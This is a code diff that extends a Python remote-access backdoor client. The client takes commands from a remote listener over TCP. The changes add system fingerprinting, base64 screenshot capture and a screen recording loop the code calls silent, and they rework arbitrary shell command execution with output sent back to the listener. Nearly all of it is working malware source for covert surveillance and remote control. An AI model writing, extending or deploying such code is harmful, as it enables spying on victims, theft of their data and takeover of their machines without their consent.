@@ -4,6 +4,14 @@ import time # Provides various functions for working with time-related operation
 import subprocess # Allows use to run system commands or external programs from your Python script.
 import json # Used for storing and transferring data between the browser and the server.
 import os # Import the os module for interacting with the file system.
+import platform # This module has various functions that can be used to get the information like the OS name and its version.
+import mss    # library to take screenshots
+import io           # in-memory byte buffer (file-like)
+import base64       # for encoding binary data to text for JSON transport
+import pyautogui # Provides functions for controlling the mouse and keyboard, taking screenshots, and locating elements on the screen.
+import cv2 # OpenCV library for computer vision and video processing.
+import numpy as np # Library for numerical operations on arrays and matrices.
+import tempfile # Provides functions to create temporary files and directories safely.
 
 # Function to send data reliably in JSON format
 def reliable_send(data):
@@ -51,6 +59,60 @@ def download_file(file_name):
     s.settimeout(None)                  # Remove timeout setting
     f.close()                           # Close the file
 
+def record_screen_controlled(sock, fps=10):
+    import tempfile
+
+    # Ensure recordings folder exists
+    save_dir = "recordings"
+    os.makedirs(save_dir, exist_ok=True)
+
+    # Temporary file for recording
+    tmp_path = tempfile.mktemp(suffix=".avi")
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        frame0 = np.array(sct.grab(monitor))
+        h, w = frame0.shape[:2]
+        out = cv2.VideoWriter(tmp_path, fourcc, fps, (w, h))
+
+        print("[*] Recording started (silently)...")
+        try:
+            while True:
+                # check for JSON control message
+                ctrl = try_recv_json(sock, timeout=0.02)
+                if isinstance(ctrl, dict) and ctrl.get("type") == "record_stop":
+                    print("[*] Received stop command from server.")
+                    break
+
+                # capture frame and write
+                img = np.array(sct.grab(monitor))
+                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+                out.write(frame)
+
+                time.sleep(1.0 / fps)
+        finally:
+            out.release()
+
+    # Now send the file (it will go into recordings folder)
+    filename = f"record_{int(time.time())}.avi"
+    final_path = os.path.join(save_dir, filename)
+    os.rename(tmp_path, final_path)  # move temp file to recordings folder
+
+def try_recv_json(sock, timeout=0.01):
+    sock.settimeout(timeout)
+    try:
+        data = sock.recv(4096).decode()
+        if not data:
+            return None
+        return json.loads(data)
+    except socket.timeout:
+        return None
+    except ValueError:
+        return None
+    finally:
+        sock.settimeout(None)
+
 # Function to handle incoming commands from the server
 def shell():
     while True:                         # Keep listening for commands
@@ -65,12 +127,50 @@ def shell():
             upload_file(command[9:])    # Send specified file to the server
         elif command[:6] == 'upload':   # If upload command received
             download_file(command[7:])  # Receive file from the server
-        else:                           # For all other commands
-            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Execute the command
-            result = execute.stdout.read() + execute.stderr.read() # Capture standard output and error
-            result = result.decode()    # Decode result from bytes to string
-            reliable_send(result)       # Send the command output back to the server
+        elif command == 'os':           # If the command received from the listener is 'os'
+            # Collect system information           
+            info = {
+                "system": platform.system(), # Example: 'Windows', 'Linux', or 'Darwin' (macOS)
+                "node": platform.node(),        # The computer's network name
+                "release": platform.release(),  # OS release version (e.g., '10' or '6.6.0')
+                "version": platform.version(),  # Detailed OS build version
+                "machine": platform.machine(),  # Hardware type (e.g., 'x86_64', 'AMD64')
+                "processor": platform.processor()    # CPU info
+            } 
+            reliable_send(info)  # SEND the info back to the listener!  
+        elif command == 'screenshot':
+            try:
+                # local imports so rest of script doesn't require these libs
+                import mss, base64, io
+                from PIL import Image #ignore this error
 
+                # capture screen
+                with mss.mss() as sct:
+                    raw = sct.grab(sct.monitors[0])   # raw.rgb and raw.size
+
+                # build a Pillow image from raw pixels, then save PNG into BytesIO
+                img = Image.frombytes('RGB', raw.size, raw.rgb)
+                buf = io.BytesIO()
+                img.save(buf, format='PNG')
+
+                # encode and send
+                png_b64 = base64.b64encode(buf.getvalue()).decode('ascii')
+                reliable_send({"type": "screenshot", "data": png_b64})
+
+            except Exception as e:
+                # send repr so listener prints the full traceback-ish info
+                reliable_send({"type": "screenshot_error", "error": repr(e)})
+        elif command == 'record':
+            try:
+                record_screen_controlled(s)  # <-- pass the socket
+            except Exception as e:
+                reliable_send({"type": "record_error", "error": repr(e)})
+        else:
+            try:
+                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                reliable_send(result.decode())
+            except Exception as e:
+                reliable_send(str(e))
 # Create a socket object for TCP communication using IPv4
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # AF_INET = IPv4, SOCK_STREAM = TCP
 
